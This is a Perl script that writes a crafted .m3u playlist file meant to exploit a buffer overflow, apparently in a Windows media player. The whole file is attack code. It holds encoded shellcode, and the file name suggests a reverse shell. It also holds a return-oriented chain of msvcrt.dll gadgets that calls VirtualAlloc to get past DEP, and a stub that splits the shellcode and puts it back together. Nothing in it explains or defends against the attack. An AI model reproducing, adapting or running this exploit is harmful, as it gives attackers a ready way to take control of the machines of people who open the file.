$file= "cutnshopreverse.m3u";


$cutnshut = "\xFC\x8B\xFC\x8B\xF4\x83\xEE\x72\x83\xEE\x73" .
"\x83\xC7\x79\x83\xC7\x79\x83\xC7\x25\x33\xc9\xB1\x5D\xF3\xA4";


$shellcode= "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6f" .
"\xdd\xfe\xc6\x83\xeb\xfc\xe2\xf4\x93\x35\x7c\xc6\x6f\xdd" .
"\x9e\x4f\x8a\xec\x3e\xa2\xe4\x8d\xce\x4d\x3d\xd1\x75\x94" .
"\x7b\x56\x8c\xee\x60\x6a\xb4\xe0\x5e\x22\x52\xfa\x0e\xa1" .
"\xfc\xea\x4f\x1c\x31\xcb\x6e\x1a\x1c\x34\x3d\x8a\x75\x94" .
"\x7f\x56\xb4\xfa\xe4\x91\xef\xbe\x8c\x95\xff\x17\x3e\x56" .
"\xa7\xe6\x6e\x0e\x75\x8f\x77\x3e\xc4\x8f\xe4\xe9\x75\xc7" .
"\xb9\xec\x01\x6a\xae\x12\xf3\xc7\xa8\xe5\x1e\xb3\x99\xde" .
"\x83\x3e\x54\xa0\xda\xb3\x8b\x85\x75\x9e\x4b\xdc\x2d\xa0" .
"\xe4\xd1\xb5\x4d\x37\xc1\xff\x15\xe4\xd9\x75\xc7\xbf\x54" .
"\xba\xe2\x4b\x86\xa5\xa7\x36\x87\xaf\x39\x8f\x82\xa1\x9c" .
"\xe4\xcf\x15\x4b\x32\xb5\xcd\xf4\x6f\xdd\x96\xb1\x1c\xef" .
"\xa1\x92\x07\x91\x89\xe0\x68\x22\x2b\x7e\xff\xdc\xfe\xc6" .
"\x46\x19\xaa\x96\x07\xf4\x7e\xad\x6f\x22\x2b\x96\x3f\x8d" .
"\xae\x86\x3f\x9d\xae\xae\x85\xd2\x21\x26\x90\x08\x69\xac" .
"\x6a\xb5\x3e\x6e\x6f\x15\x96\xc4\x6f\xd8\xc7\x4f\x89\xb7" .
"\xee\x90\x38\xb5\x67\x63\x1b\xbc\x01\x13\xea\x1d\x8a\xca" .
"\x90\x93\xf6\xb3\x83\xb5\x0e\x73\xcd\x8b\x01\x13\x07\xbe" .
"\x93\xa2\x6f\x54\x1d\x91\x38\x8a\xcf\x30\x05\xcf\xa7\x90" .
"\x8d\x20\x98\x01\x2b\xf9\xc2\xc7\x6e\x50\xba\xe2\x7f\x1b" .
"\xfe\x82\x3b\x8d\xa8\x90\x39\x9b\xa8\x88\x39\x8b\xad\x90" .
"\x07\xa4\x32\xf9\xe9\x22\x2b\x4f\x8f\x93\xa8\x80\x90\xed" .
"\x96\xce\xe8\xc0\x9e\x39\xba\x66\x0e\x73\xcd\x8b\x96\x60" .
"\xfa\x60\x63\x39\xba\xe1\xf8\xba\x65\x5d\x05\x26\x1a\xd8" .
"\x45\x81\x7c\xaf\x91\xac\x6f\x8e\x01\x13";

#$shellcode= "a" . "A" x 251 . "a";
#$shellcode.= "b" . "B" x 91 . "b";



$buffer= "\\";
$buffer .= substr $shellcode, 253, (346-253);#fin du shell

$buffer .= "C" x (137-346+253);
$buffer .= pack('V',0x77c11110);#first ret
#ROP

$buffer .= pack('V',0x77c2e75b);  # POP EBP # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c2e75b);  # skip 4 bytes [msvcrt.dll]
$buffer .= pack('V',0x77c53436);  # POP EBX # RETN [msvcrt.dll]
$buffer .= pack('V',0xffffffff);  #
$buffer .= pack('V',0x77c127e5);  # INC EBX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c127e1);  # INC EBX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c3b860);  # POP EAX # RETN [msvcrt.dll]
$buffer .= pack('V',0x2cfe1467);  # put delta into eax (-> put 0x00001000 into edx)
$buffer .= pack('V',0x77c4eb80);  # ADD EAX);75C13B66 # ADD EAX);5D40C033 # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c58fbc);  # XCHG EAX);EDX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c34de1);  # POP EAX # RETN [msvcrt.dll]
$buffer .= pack('V',0x2cfe04a7);  # put delta into eax (-> put 0x00000040 into ecx)
$buffer .= pack('V',0x77c4eb80);  # ADD EAX);75C13B66 # ADD EAX);5D40C033 # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c14001);  # XCHG EAX);ECX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c47a26);  # POP EDI # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c47a42);  # RETN (ROP NOP) [msvcrt.dll]
$buffer .= pack('V',0x77c3a184);  # POP ESI # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c2aacc);  # JMP [EAX] [msvcrt.dll]
$buffer .= pack('V',0x77c5289b);  # POP EAX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c1110c);  # ptr to &VirtualAlloc() [IAT msvcrt.dll]
$buffer .= pack('V',0x77c12df9);  # PUSHAD # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c354b4);  # ptr to 'push esp # ret ' [msvcrt.dll]

#cutnshop
$buffer .= $cutnshut;
$buffer .= substr $shellcode, 0, 253;#deput du shell
$buffer .="90" x 10;






open($FILE,">$file");
print $FILE $buffer;
close($FILE);

